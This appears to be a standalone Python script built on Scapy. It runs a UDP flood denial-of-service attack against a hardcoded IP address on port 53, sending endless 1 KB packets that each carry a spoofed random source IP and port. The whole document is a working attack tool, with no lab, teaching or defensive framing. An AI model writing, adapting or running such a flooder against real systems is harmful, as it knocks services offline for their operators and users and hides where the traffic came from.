```python
from scapy.all import RandIP, IP, UDP, Raw, send
import random

# Target IP and port
target_ip = "192.10.1.1"  
target_port = 53  # Replace with the target port

# UDP Flood attack function
def udp_flood(target_ip, target_port):
    while True:
        # Random source IP and port
        src_ip = str(RandIP())
        src_port = random.randint(1024, 65535)
        # Create IP and UDP layers with payload
        packet = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / Raw(load="X" * 1024)
        # Send the packet
        send(packet, verbose=0)

# Start the UDP Flood attack
udp_flood(target_ip, target_port)
